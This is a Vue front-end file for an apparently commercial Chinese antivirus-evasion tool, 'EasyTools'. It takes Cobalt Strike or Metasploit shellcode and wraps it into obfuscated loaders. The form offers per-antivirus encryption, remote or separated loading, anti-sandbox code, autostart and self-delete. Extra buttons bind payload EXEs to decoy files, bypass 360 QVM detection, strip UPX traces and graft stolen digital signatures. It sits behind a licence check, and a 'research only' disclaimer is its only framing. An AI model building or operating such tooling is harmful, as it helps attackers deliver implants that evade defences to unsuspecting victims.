<template>
  <div class="home" @contextmenu.prevent>
    <div class="header">
      <h1>ShellCode免杀处理平台</h1>
      <p class="subheader">
        简简单单打点&nbsp;&nbsp;&nbsp;一键欢乐梭哈
      </p>
    </div>

    <div class="upload-container">
      <!-- 文件上传区 -->
      <div class="upload-section">
        <el-upload class="upload-demo" ref="upload" action="http://127.0.0.1:52867/upload" drag :auto-upload="false"
          :show-file-list="true" :limit="1" :before-upload="beforeUpload" :http-request="handleUpload"
          @change="handleFileChange">
          <div class="upload-icon">
            <el-icon><upload-filled /></el-icon>
          </div>
          <div class="el-upload__text">
            使用CS、MSF生成bin文件，将文件拖拽或 <em>点击这里上传</em>
          </div>
          <template #tip>
            <div class="el-upload__tip">推荐使用garble进行混淆加密 注：使用前需要进行环境配置，配置教程
              <el-tooltip
                  effect="dark"
                  content="环境安装教程：https://www.yuque.com/yuqueyonghuoxdahr/aae1ol/tdqgk1gwxns8g6ts"
                  placement="top"
              >
                <el-icon><QuestionFilled /></el-icon>
              </el-tooltip>
            </div>
          </template>
        </el-upload>
      </div>

      <!-- 选项区域 -->
      <div class="select-section">
        <el-select class="select-container" v-model="loadWay" placeholder="选择加载模式">
          <el-option v-for="(mode, index) in loadList" :key="index" :label="mode" :value="mode"></el-option>
        </el-select>

        <el-select class="select-container" v-model="mode" placeholder="选择运行模式" @change="handleModeChange">
          <el-option v-for="(mode, index) in modeList" :key="index" :label="mode" :value="mode"></el-option>
        </el-select>

        <el-select class="select-container" v-model="encodeWay" placeholder="选择加密方式">
          <el-option v-for="(item, index) in encodeWayList" :key="index" :label="item" :value="item"></el-option>
        </el-select>

        <el-select class="select-container" v-model="av" placeholder="选择杀软类型">
          <el-option v-for="(item, index) in avList" :key="index" :label="item" :value="item"></el-option>
        </el-select>

        <el-select class="select-container" v-model="buildWay" placeholder="选择编译方式">
          <el-option v-for="(item, index) in buildWayList" :key="index" :label="item" :value="item"></el-option>
        </el-select>

        <el-select class="select-container" v-model="passBoxWay" placeholder="是否添加反沙箱代码">
          <el-option v-for="(item, index) in passBoxWayList" :key="index" :label="item" :value="item"></el-option>
        </el-select>

        <el-select class="select-container" v-model="autoRun" placeholder="添加自启动(360不建议)">
          <el-option v-for="(item, index) in autoRunList" :key="index" :label="item" :value="item"></el-option>
        </el-select>

        <el-select class="select-container" v-model="autoDelete" placeholder="添加自删除">
          <el-option v-for="(item, index) in autoDeleteList" :key="index" :label="item" :value="item"></el-option>
        </el-select>
      </div>

      <!-- 提交按钮 -->
      <div class="action-section">
        <!-- 远程 -->
        <div v-if="loadWay === '远程'">
          <p style="color: #9c7f64">
            远程加载请先点击shellcode预处理，然后将处理后的yuancheng.bin文件上传后使用
          </p>

          <template v-if="autoDelete === 'true'">
            <!-- 两个输入框，分行 -->
            <el-input
                class="action-yuancheng-button"
                placeholder="请输入程序失效时间，格式(2025-08-17 23:59:59)"
                v-model="autoDeleteTime"
            >
              <template #suffix>
                <el-button
                    type="primary"
                    plain
                    size="small"
                    @click.stop="setDefaultDeleteTime"
                    style="margin-right: -5px;"
                >
                  <el-tooltip content="填充24小时后的时间" placement="top">
                    <el-icon><Clock /></el-icon>
                  </el-tooltip>
                </el-button>
              </template>
            </el-input>


            <el-input
                class="action-yuancheng-button"
                placeholder="请输入远程加载URL"
                v-model="yuanchengUrlOrFileName"
            />
            <div class="action-btns">
              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">shellcode预处理</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>

          <template v-else>
            <!-- 一行：URL + 按钮们 -->
            <div class="action-row">
              <el-input
                  class="action-yuancheng-button"
                  placeholder="请输入远程加载URL"
                  v-model="yuanchengUrlOrFileName"
              />
              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">shellcode预处理</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>
        </div>

        <!-- 分离 -->
        <div v-else-if="loadWay === '分离'">
          <template v-if="autoDelete === 'true'">
            <!-- 两个输入框，分行 -->
            <el-input
                class="action-yuancheng-button"
                placeholder="请输入程序失效时间，格式(2025-08-17 23:59:59)"
                v-model="autoDeleteTime"
            >
              <template #suffix>
                <el-button
                    type="primary"
                    plain
                    size="small"
                    @click.stop="setDefaultDeleteTime"
                    style="margin-right: -5px;"
                >
                  <el-tooltip content="填充24小时后的时间" placement="top">
                    <el-icon><Clock /></el-icon>
                  </el-tooltip>
                </el-button>
              </template>
            </el-input>

            <el-input
                class="action-yuancheng-button"
                placeholder="请输入分离加载文件名"
                v-model="yuanchengUrlOrFileName"
            />
            <div class="action-btns">
              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">处理bin文件</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>

          <template v-else>
            <!-- 一行：文件名 + 按钮们 -->
            <div class="action-row">
              <el-input
                  class="action-yuancheng-button"
                  placeholder="请输入分离加载文件名"
                  v-model="yuanchengUrlOrFileName"
              />
              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">处理bin文件</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>
        </div>

        <!-- 一体 -->
        <div v-else>
          <template v-if="autoDelete === 'true'">
            <!-- 一行：时间 + 按钮们 -->
            <div class="action-row">
              <el-input
                  class="action-yuancheng-button"
                  placeholder="请输入程序失效时间，格式(2025-08-17 23:59:59)"
                  v-model="autoDeleteTime"
              >
                <template #suffix>
                  <el-button
                      type="primary"
                      plain
                      size="small"
                      @click.stop="setDefaultDeleteTime"
                      style="margin-right: -5px;"
                  >
                    <el-tooltip content="填充24小时后的时间" placement="top">
                      <el-icon><Clock /></el-icon>
                    </el-tooltip>
                  </el-button>
                </template>
              </el-input>

              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">处理bin文件</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>

          <template v-else>
            <!-- 一行：按钮们 -->
            <div class="action-row">
              <el-button :disabled="!isFormValid" type="primary" @click="handleUpload">处理bin文件</el-button>
              <el-button :disabled="!isFormValid" type="success" @click="handleGenerate">编译生成</el-button>
            </div>
          </template>
        </div>
      </div>


      <!-- 提示信息 -->
      <el-alert v-if="uploadStatus" :title="uploadStatus" :type="uploadStatus.includes('表单') ? 'error' : 'success'"
        show-icon class="status-message" />
    </div>

    <!-- EXE处理 -->
    <div class="action-exe-section">
      <p class="exe-message">EXE处理</p>
      <div class="button-container">
        <el-button type="success" class="action-changeExe1-button action-kunbang-button" @click="openDialog('binder')">
          文件捆绑
        </el-button>
        <el-button type="success" class="action-changeExe1-button" @click="openDialog('changeSize')">
          体积修改
        </el-button>
        <el-button type="success" class="action-changeExe1-button" @click="openDialog('byPassQvm')">
          绕过Qvm查杀
        </el-button>
        <el-button type="success" class="action-changeExe2-button" @click="openDialog('removeUpx')">
          去除UPX特征
        </el-button>
        <el-button type="success" class="action-changeExe2-button" @click="openDialog('addSignthief')">
          增加数字签名
        </el-button>
        <el-button type="success" class="action-changeExe2-button" @click="openDir">
          打开EasyToolsFiles文件夹
        </el-button>
      </div>
    </div>

    <!-- EXE处理弹出框 -->
    <el-dialog v-model="dialogVisible" :title="getDialogTitle()" width="500px">
      <el-form :model="changeExeSizeForm" label-width="80px">
        <div v-if="dialogMode === 'binder'" class="binder-container">
          <!-- 左侧EXE上传 -->
          <div class="upload-column exe-upload">
            <!-- Payload EXE 文件上传 -->
            <el-upload
                ref="uploadExe"
                name="payload_exe"
                :auto-upload="false"
                :limit="1"
                :before-upload="handleExeBeforeUpload"
                :on-change="handleExeChange"
                :on-exceed="handleExceed"
                accept=".exe"
            >
              <div class="upload-content">
                <el-icon class="upload-icon"><upload-filled /></el-icon>
                <div class="upload-text">
                  <div class="title">Payload EXE文件</div>
                  <div class="requirements">• 必须为可执行文件</div>
                  <em>点击选择文件</em>
                </div>
              </div>
            </el-upload>
          </div>

          <!-- 右侧文件上传 -->
          <div class="upload-column binder-upload">
            <el-upload
                ref="uploadBinder"
                name="binder_file"
                :auto-upload="false"
                :limit="1"
                :before-upload="handleBinderBeforeUpload"
                :on-change="handleBinderChange"
                :on-exceed="handleExceed"
                :accept="excludeExeAccept"
            >
              <div class="upload-content">
                <el-icon class="upload-icon"><upload-filled /></el-icon>
                <div class="upload-text">
                  <div class="title">捆绑文件</div>
                  <div class="requirements">• 禁止EXE文件</div>
                  <div class="requirements">• 支持任意格式</div>
                  <em>点击选择文件</em>
                </div>
              </div>
            </el-upload>
          </div>
        </div>
        <!-- 文件上传区 -->
        <el-upload v-else class="upload-demo" ref="upload" action="http://127.0.0.1:52867/upload" drag :auto-upload="true"
          :show-file-list="true" :limit="1" :before-upload="beforeUpload">
          <div class="upload-icon">
            <el-icon><upload-filled /></el-icon>
          </div>
          <!-- 判断dialogMode的值 -->
          <template v-if="dialogMode === 'addSignthief' || dialogMode === 'byPassQvm'">
            可直接选择文件处理或者批量将文件放置EasyToolsFiles/file进行批量处理 <em>点击这里上传</em>
          </template>
          <template v-else-if="dialogMode === 'yuanchengDeal'">
            请选择需要加载的shellcode.bin文件 <em>点击这里上传</em>
          </template>
          <template v-else>
            请使用免杀处理后的exe文件，将文件拖拽或 <em>点击这里上传</em>
          </template>
        </el-upload>

        <!-- 体积大小输入框 -->
        <el-form-item label="体积大小" prop="size" v-if="dialogMode === 'changeSize'">
          <el-input v-model="changeExeSizeForm.size" placeholder="请输入需要修改的体积大小" type="number"></el-input>
        </el-form-item>

      </el-form>

      <template #footer>
        <div v-if="dialogMode === 'binder'">
          <el-button @click="dialogVisible = false">取消</el-button>
          <el-button type="primary" @click="handleBinderSubmit">开始捆绑</el-button>
        </div>
        <div v-else>
          <el-button @click="dialogVisible = false">取消</el-button>
          <el-button type="primary" @click="handleChangeExeSubmit">修改</el-button>
        </div>
      </template>
    </el-dialog>

    <!-- 授权弹出框 -->
    <el-dialog
        v-model="dialogAuthVisible"
        title="授权提示"
        width="500px"
        :close-on-click-modal="false"
    >
      <el-form :model="authform" label-width="120px">
        <el-form-item label="机器码">
          <el-input
              v-model="authform.MachineCode"
              readonly
              class="copyable-input"
          >
            <template #append>
              <el-button
                  :icon="DocumentCopy"
                  @click="copyMachineCode"
              />
            </template>
          </el-input>
        </el-form-item>

        <el-form-item label="授权码" prop="AuthCode" required>
          <el-input
              v-model="authform.AuthCode"
              placeholder="请输入授权码"
              clearable
              show-password
              @keyup.enter="handleAuthSubmit"
          />
        </el-form-item>
      </el-form>

      <div style="color: #f56c6c; margin-top: 15px; margin-bottom: 10px; padding-left: 20px;">
        提示：授权码通常由字母、数字和符号组成，区分大小写
      </div>

      <template #footer>
        <el-button @click="dialogAuthVisible = false">取消</el-button>
        <el-button
            type="primary"
            @click="handleAuthSubmit"
            :loading="authLoading"
            :disabled="!authform.AuthCode"
        >
          验证
        </el-button>
      </template>
    </el-dialog>

    <el-footer class="footer">
      <p>&copy; 免责申明：仅限研究学习使用。<br> 由于传播、利用此工具而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关，且不为此承担任何责任。</p>
    </el-footer>
  </div>
</template>

<script>
import axios from "axios";
import { ElMessageBox, ElMessage } from "element-plus";
import {Clock, DocumentCopy, QuestionFilled, UploadFilled} from '@element-plus/icons-vue';
import {CheckUseNums, IsInit, GetMachineCode,VerifyAuth} from "../../wailsjs/go/controller/ShellConfig"

export default {
  name: "BypassAvView",
  data() {
    return {
      selectedFile: null, // 选中的文件
      mode: "", // 运行模式
      av: "", // 杀软标签
      encodeWay: "",  // 加密方式标签
      buildWay: "", // 编译方式标签
      loadWay: "", // 加载器方式标签
      passBoxWay: "", // 添加反杀箱代码标签
      autoRun: "", //添加自启动代码标签
      autoDelete: "", //添加自删除代码标签
      autoDeleteTime: "", // 添加自删除校验时间
      yuanchengUrlOrFileName:"", // 远程加载url

      modeList: [], // 运行模式列表
      loadList: ["一体","远程","分离"], // 加载模式列表
      avList: [], // 杀软列表
      encodeWayList: [], // 加密方式列表
      buildWayList: ["go", "garble"], // 加密方式列表
      passBoxWayList:["true", "false"], // 添加反杀箱代码列表
      autoRunList:["true", "false"], // 添加自启动列表
      autoDeleteList:["true", "false"], // 添加自删除列表
      uploadStatus: "", // 上传状态信息

      fileType: "bin",
      dialogMode: "",
      dialogVisible: false,
      dialogAuthVisible: false,
      authLoading:false,

      changeExeSizeForm: {
        size: "",
      },

      authform: {
        MachineCode: "",
        AuthCode: "",
      },

      excludeExeAccept: "*",
      // 用于在提交时直接获取文件对象
      exeFile: null,
      binderFile: null
    };
  },
  computed: {
    DocumentCopy() {
      return DocumentCopy
    },
    isFormValid() {
      if (this.loadWay === "一体"){
        if (this.autoDelete === true){
          return this.selectedFile && (this.mode && this.loadWay && this.av&& this.encodeWay && this.passBoxWay && this.buildWay && this.autoRun && this.autoDelete && this.autoDeleteTime); // 检查是否填写完整表单
        }else {
          return this.selectedFile && (this.mode && this.loadWay && this.av&& this.encodeWay && this.passBoxWay && this.buildWay && this.autoRun && this.autoDelete)
        }
      } else{
        if (this.autoDelete === true){
          return this.selectedFile && (this.mode && this.loadWay && this.av && this.encodeWay && this.passBoxWay && this.buildWay && this.autoRun  && this.autoDelete && this.autoDeleteTime) && (this.yuanchengUrlOrFileName); // 检查是否填写完整表单
        } else {
          return this.selectedFile && (this.mode && this.loadWay && this.av && this.encodeWay && this.passBoxWay && this.buildWay && this.autoRun  && this.autoDelete) && (this.yuanchengUrlOrFileName); // 检查是否填写完整表单
        }
      }
    },
  },
  components: {
    Clock,
    UploadFilled,
    QuestionFilled,
    // 注册图标组件
    'el-icon-copy-document': DocumentCopy
  },
  mounted() {
    this.fetchModeList(); // 页面加载时获取模式列表
  },
  methods: {
    fetchModeList() {
      axios
        .get("http://127.0.0.1:52867/modelist")
        .then((response) => {
          this.modeList = response.data.all_modes;
        })
        .catch((error) => {
          console.error("Error fetching mode list:", error);
        });
    },
    fetchAvList() {
      if (this.mode) {
        axios
          .get(`http://127.0.0.1:52867/avlist`)
          .then((response) => {
            this.avList = response.data.av_list;
          })
          .catch((error) => {
            console.error("Error fetching AV list:", error);
          });
      }
    },
    fetchEncodewayList() {
      if (this.mode) {
        axios
          .get(`http://127.0.0.1:52867/encodewaylist`)
          .then((response) => {
            this.encodeWayList = response.data.encode_way_list;
          })
          .catch((error) => {
            console.error("Error fetching encodeWay list:", error);
          });
      }
    },
    handleModeChange() {
      this.fetchAvList();
      this.fetchEncodewayList();
    },
    getDialogTitle() {
      switch (this.dialogMode) {
        case 'binder':
          return '文件捆绑';
        case 'changeSize':
          return '体积修改';
        case 'byPassQvm':
          return '绕过Qvm查杀';
        case 'removeUpx':
          return '去除UPX特征';
        case 'addSignthief':
          return '增加数字签名';
        default:
          return '体积修改';
      }
    },
    setDefaultDeleteTime() {
      // 计算24小时后的时间
      const now = new Date();
      const expiry = new Date(now.getTime() + 24 * 60 * 60 * 1000);

      // 格式化为 YYYY-MM-DD HH:mm:ss
      const year = expiry.getFullYear();
      const month = String(expiry.getMonth() + 1).padStart(2, '0');
      const day = String(expiry.getDate()).padStart(2, '0');
      const hours = String(expiry.getHours()).padStart(2, '0');
      const minutes = String(expiry.getMinutes()).padStart(2, '0');
      const seconds = String(expiry.getSeconds()).padStart(2, '0');

      this.autoDeleteTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;

      this.$message.success('已填充24小时后的自删除时间');
    },

    beforeUpload(file) {
      if (this.fileType === "bin") {
        const isBin = file.name.endsWith(".bin");
        if (!isBin) {
          ElMessage.error("请上传bin文件！");
          this.selectedFile = null;
          return false;  // Prevent the file upload
        }
      } else {
        const isBin = file.name.endsWith(".exe");
        if (!isBin) {
          ElMessage.error("请上传exe文件！");
          this.selectedFile = null;
          return false;  // Prevent the file upload
        }
      }

      return true;
    },



    handleFileChange(file) {
      this.selectedFile = file;
    },
    handleUpload() {
      if (this.isFormValid) {
        const formData = new FormData();
        formData.append("file", this.selectedFile.raw);
        formData.append("loadWay", this.loadWay); // 添加loadWay参数
        formData.append("yuanchengUrlOrFileName",this.yuanchengUrlOrFileName)
        formData.append("autoDeleteTime",this.autoDeleteTime)

        axios
          .post("http://127.0.0.1:52867/upload", formData, {
            headers: { "Content-Type": "multipart/form-data" },
          })
          .then(() => {
            this.uploadStatus = "文件处理成功！";
            setTimeout(() => {
              this.uploadStatus = "";
            }, 3000); // 3秒后重置状态
          })
          .catch(() => {
            this.uploadStatus = `文件处理失败！请上传${this.fileType === 'bin' ? 'bin' : 'exe'}文件`;

            this.selectedFile = null;
            this.$refs.upload.clearFiles();
            setTimeout(() => {
              this.uploadStatus = "";
            }, 3000); // 3秒后重置状态
          });
      } else {
        this.uploadStatus = "请完成表单后再提交。";
        setTimeout(() => {
          this.uploadStatus = "";
        }, 3000); // 3秒后重置状态
      }
    },

    handleExeBeforeUpload(file) {
      console.log("handleExeBeforeUpload 被调用，file:", file);
      // 可在此处做额外校验，比如文件大小检查
      return true; // 返回 true 允许继续选择
    },
    // on-change 回调，当选择文件后触发
    handleExeChange(file, fileList) {
      console.log("handleExeChange:", file, fileList);
      // 将上传组件中选中的第一个文件存入 data
      // file.raw 为原生 File 对象，部分版本返回 file 本身
      this.exeFile = file.raw || file;
    },
    handleBinderBeforeUpload(file) {
      console.log("handleBinderBeforeUpload 被调用，file:", file);
      if (file.name.toLowerCase().endsWith('.exe')) {
        this.$message.error('捆绑文件不能为EXE格式');
        return false; // 拒绝该文件上传
      }
      return true;
    },
    handleBinderChange(file, fileList) {
      console.log("handleBinderChange:", file, fileList);
      this.binderFile = file.raw || file;
    },
    handleExceed(files, fileList) {
      this.$message.warning('一次只能上传一个文件');
    },
    handleBinderSubmit() {
      console.log("提交时的 exeFile:", this.exeFile);
      console.log("提交时的 binderFile:", this.binderFile);

      if (!this.exeFile) {
        this.$message.error("请先选择Payload EXE文件");
        return;
      }
      if (!this.binderFile) {
        this.$message.error("请先选择捆绑文件");
        return;
      }

      this.$message.info("正在捆绑中，请稍等~~~");

      const formData = new FormData();
      formData.append('payload_exe', this.exeFile);
      formData.append('binder_file', this.binderFile);

      axios.post('http://127.0.0.1:52867/binder', formData)
          .then(res => {
            if (res.data.success) {
              this.$message.success("捆绑文件成功，请前往EasyToolsFiles/file进行查看");
              ElMessageBox.close();
              ElMessageBox({
                title: "捆绑文件成功",
                message: "生成完成，请在 EasyToolsFiles/file 目录进行查看。",
                type: "success",
              });
            } else {
              this.$message.error(res.data.error);
            }
          })
          .catch(err => {
            this.$message.error("捆绑文件失败");
            console.error(err);
          });
    },


    async handleGenerate() {
      try {
        await IsInit();
        const canUse = await CheckUseNums();
        if (canUse){
  // 设置消息文本
          const message = this.buildWay === "garble"
              ? "请耐心稍等，混淆加密生成很慢~~，正在进行生成操作..."
              : "请稍等，正在进行生成操作...";

          if (this.isFormValid) {
            ElMessageBox({
              title: "正在生成",
              message: message,
              type: "info",
              showConfirmButton: false,
              closeOnClickModal: false,
              closeOnPressEscape: false,
            });

            const data = {
              mode: this.mode,
              av: this.av,
              encodeWay: this.encodeWay,
              buildWay: this.buildWay,
              loadWay: this.loadWay,
              passBoxWay: this.passBoxWay,
              autoRun: this.autoRun,
              autoDelete: this.autoDelete,
              autoDeleteTime: this.autoDeleteTime,
              yuanchengUrlOrFileName: this.yuanchengUrlOrFileName,
            };

            axios
                .post("http://127.0.0.1:52867/make", data, {
                  headers: { "Content-Type": "application/json" },
                })
                .then(() => {
                  ElMessageBox.close();
                  ElMessageBox({
                    title: "生成完成",
                    message: "生成完成，请在 EasyToolsFiles/file 目录进行查看。",
                    type: "success",
                  });
                })
                .catch((error) => {
                  ElMessageBox.close();
                  ElMessage.error({
                    message: "生成失败，请稍后再试。" + (error.response ? ` 错误信息: ${error.response.data}` : ""),
                    type: "error",
                  });
                });
          } else {
            this.uploadStatus = "请完成表单后再提交。";
            setTimeout(() => {
              this.uploadStatus = "";
            }, 3000);  // 3秒后重置状态
          }
        } else {
          await ElMessageBox({
            title: "温馨提示",
            message: "美好的时光总是转瞬即逝，EasyTools免杀期待与您再次相逢",
            type: "warning",
            showConfirmButton: false,
            closeOnClickModal: false,
            closeOnPressEscape: false,
          });
        }
      } catch (error) {
        // ElMessage.warning(`如需继续使用，请联系作者大大哦`);
        this.dialogAuthVisible = true
        this.authform.MachineCode =  await GetMachineCode();
      }
    },

    handleBypassQvm() {
      ElMessageBox({
        title: "正在生成",
        message: "请稍等，正在进行生成操作...",
        type: "info",
        showConfirmButton: false,
        closeOnClickModal: false,
        closeOnPressEscape: false,
      });

      axios
        .get("http://127.0.0.1:52867/passqvm")
        .then(() => {
          ElMessageBox.close();
          ElMessageBox({
            title: "生成完成",
            message: "生成完成，请在 EasyToolsFiles/file 目录进行查看。",
            type: "success",
          });
        })
        .catch((error) => {
          ElMessageBox.close();
          ElMessage.error({
            message: "生成失败，请稍后再试。" + (error.response ? ` 错误信息: ${error.response.data}` : ""),
            type: "error",
          });
        });
    },

    // 打开弹出框
    openDialog(mode) {
      this.dialogMode = mode;
      if (this.dialogMode === "yuanchengDeal"){
        this.fileType = "bin"
      } else {
        this.fileType = "exe"
      }
      this.dialogVisible = true;
    },
    // 打开文件夹
    openDir() {
      axios
        .get("http://127.0.0.1:52867/opendir")
        .catch(() => {
          ElMessage.error({
            message: "打开文件夹失败",
            type: "error",
          });
        });
    },

    // 复制机器码
    copyMachineCode() {
      navigator.clipboard.writeText(this.authform.MachineCode)
          .then(() => this.$message.success('机器码已复制'))
          .catch(() => this.$message.error('复制失败'));
    },

    // 校验授权码
    async handleAuthSubmit() {
      if (!this.authform.AuthCode.trim()) {
        this.$message.warning('请输入授权码');
        return;
      }

      this.authLoading = true;

      try {
        const res = await VerifyAuth(this.authform.MachineCode,
            this.authform.AuthCode.trim())

        if (res) {
          this.$message.success('授权验证成功！程序已激活。');
          this.dialogAuthVisible = false;
          // 这里可以添加授权成功后的操作，如更新全局授权状态
        } else {
          this.$message.error('授权验证失败：' + ('请检查授权码'));
        }
      } catch (error) {
        this.$message.error('授权验证失败：' + ('请检查授权码'));
      } finally {
        this.authLoading = false;
      }
    },
    handleChangeExeSubmit() {
      if (!this.changeExeSizeForm.size && this.dialogMode === "changeSize") {
        // 关闭之前的弹窗（如果有）
        ElMessageBox.close();

        // 请输入需要修改的体积大小提示
        ElMessageBox({
          title: "提示",
          message: "请输入需要修改的体积大小！",
          type: "info",
          showConfirmButton: false,
          closeOnClickModal: false,
          closeOnPressEscape: false,
        });

        setTimeout(() => {
          // 2秒后关闭提示框
          ElMessageBox.close();
        }, 2000);
        return;
      }

      // 关闭之前的弹窗（如果有）
      ElMessageBox.close();
      // 显示正在修改的提示框
      ElMessageBox({
        title: "提示",
        message: "正在修改，请耐心等待",
        type: "info",
        showConfirmButton: false,
        closeOnClickModal: false,
        closeOnPressEscape: false,
      });

      if (this.dialogMode === "changeSize") {
        // 发送 JSON 数据
        axios
          .post("http://127.0.0.1:52867/changefilesize", { size: this.changeExeSizeForm.size }, { headers: { "Content-Type": "application/json" } })
          .then(() => {
            // 关闭之前的弹窗（如果有）
            ElMessageBox.close();

            // 文件处理成功后，显示提示框并在 5 秒后关闭
            ElMessageBox({
              title: "文件处理成功",
              message: "文件处理成功，请在 EasyToolsFiles/file 目录进行查看。",
              type: "success",
              showConfirmButton: false,
              closeOnClickModal: false,
              closeOnPressEscape: false,
            });

            setTimeout(() => {
              // 5秒后关闭提示框
              ElMessageBox.close();
            }, 5000);
          })
          .catch((error) => {
            // 关闭之前的弹窗（如果有）
            ElMessageBox.close();

            // 失败后弹出消息框
            ElMessageBox({
              title: "文件处理失败",
              message: `文件处理失败！错误信息: ${error.response?.data?.error || "未知错误"}`,
              type: "error",
              showConfirmButton: false,
              closeOnClickModal: false,
              closeOnPressEscape: false,
            });

            this.selectedFile = null;
            if (this.$refs.upload) {
              this.$refs.upload.clearFiles();
            }
          });
      } else if (this.dialogMode === "byPassQvm") {
        this.handleBypassQvm()
      } else if (this.dialogMode === "removeUpx") {
        axios
          .get("http://127.0.0.1:52867/removeupx")
          .then(() => {
            ElMessageBox.close();
            ElMessageBox({
              title: "生成完成",
              message: "生成完成，请在 EasyToolsFiles/file 目录进行查看。",
              type: "success",
            });
          })
          .catch((error) => {
            ElMessageBox.close();
            ElMessage.error({
              message: "生成失败，请稍后再试。" + (error.response ? ` 错误信息: ${error.response.data}` : ""),
              type: "error",
            });
          });
      } else if (this.dialogMode === "addSignthief") {
        axios
          .get("http://127.0.0.1:52867/addSignthief")
          .then(() => {
            ElMessageBox.close();
            ElMessageBox({
              title: "生成完成",
              message: "生成完成，请在 EasyToolsFiles/file 目录进行查看。",
              type: "success",
            });
          })
          .catch((error) => {
            ElMessageBox.close();
            ElMessage.error({
              message: "生成失败，请稍后再试。" + (error.response ? ` 错误信息: ${error.response.data}` : ""),
              type: "error",
            });
          });
      }
    }
  }
};
</script>

<style scoped>
.home {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  background-color: #f0f2f6;
  color: #ffffff;
  min-height: 100vh;
  font-family: "Arial", sans-serif;
}

.header {
  margin-top: 25px;
  margin-bottom: 5px;
}

.header h1 {
  font-size: 1.8rem;
  color: #db7714;
  margin: 0;
}

.header .subheader {
  font-size: 1.0rem;
  color: #9f7907aa;
}

.upload-container {
  max-width: 800px;
  width: 100%;
  padding: 5px;
  background: #ebe5e5;
  border-radius: 12px;
  box-shadow: 0 4px 8px rgba(237, 233, 233, 0.5);
  border: 1px solid #4caf50;
}

.upload-section {
  margin-bottom: 20px;
}

.upload-icon {
  font-size: 48px;
  color: #4caf50;
  margin-bottom: 10px;
}

.select-section {
  display: flex;
  flex-wrap: wrap; /* 允许元素换行 */
  margin-bottom: 5px;
}

.select-section > * { /* 对所有子元素应用样式 */
  flex: 0 0 25%; /* 设置子元素占满一半宽度，根据需要调整 */
  box-sizing: border-box; /* 包含padding和border在内的宽度 */
  margin-bottom: 5px; /* 设置子元素的底部外边距 */
}


.select-container {
  width: 45%;
}

.action-upload-button {
  width: 150px;
  background: linear-gradient(45deg, #1976d2, #1e63b8);
  border: none;
  color: white;
}

.action-upload-button:hover {
  background: linear-gradient(45deg, #1e63b8, #1976d2);
}

.action-make-button {
  width: 150px;
  background: linear-gradient(45deg, #81c784, #4caf50);
  border: none;
  color: white;
}

.action-make-button:hover {
  background: linear-gradient(45deg, #81c784, #4caf50);
}

.action-yuancheng-button{
  width: 350px;
  padding: 10px;
}

.action-section{
  gap: 50px;
  /* 按钮之间的间距 */
  margin-bottom: 5px;
}

.action-exe-section {
  display: flex;
  flex-direction: column;
  /* 垂直排列 */
  justify-content: center;
  /* 垂直居中 */
  align-items: center;
  /* 水平居中 */
  border: 1px solid #d3e0d4;
  border-radius: 8px;
  box-shadow: 0 4px 8px rgba(237, 233, 233, 0.5);
  background: #f8f5f5;
  margin-top: 10px;
  /* 上下边距为50px，左右自动居中 */
  padding: 8px;
  /* 调整内边距 */
  width: 77%;
  /* 设置一个宽度，以便更好地控制居中效果 */
}

.exe-message {
  color: #e7892d;
  font-weight: 700;
  font-size: 20px;
  margin-bottom: 10px;
  margin-top: -1px;
  /* 增加下边距，与按钮拉开距离 */
}

.button-container {
  display: grid;
  grid-template-columns: repeat(3, auto); /* 一行3列 */
  gap: 5px; /* 按钮之间的间距 */
  justify-items: center; /* 水平居中每个按钮 */
  margin-bottom: 5px;
}


/* 上传容器样式 */
.binder-container {
  display: flex;
  gap: 20px;
  width: 100%; /* 固定容器宽度 */
}

.upload-column {
  flex: 1;
  width: 180px;
  height: 150px; /* 固定高度 */
  border: 1px dashed #ddd;
  border-radius: 8px;
  padding: 20px;
  overflow: hidden; /* 防止内容溢出 */
}

/* 文件列表样式 */
.el-upload-list {
  max-width: 280px; /* 固定列表宽度 */
}

/* 文件名截断 */
.el-upload-list__item-name {
  display: block;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

/* 上传区域内容 */
.upload-content {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.action-changeExe1-button {
  width: 180px;
  margin-left: 10px;
  background: linear-gradient(45deg, #759f8c, #407862);
  border: none;
  color: white;
}

.action-changeExe1-button:hover {
  background: linear-gradient(45deg, #407862, #759f8c);
}

.action-changeExe2-button {
  width: 180px;
  background: linear-gradient(45deg, #2da5da, #0872df);
  border: none;
  color: white;
}
.action-changeExe2-button:hover {
  background: linear-gradient(45deg, #0872df, #2da5da);
}

.status-message {
  margin-top: 15px;
}

.footer {
  margin-top: 5px;
  font-size: 14px;
  color: #909399;
}
</style>
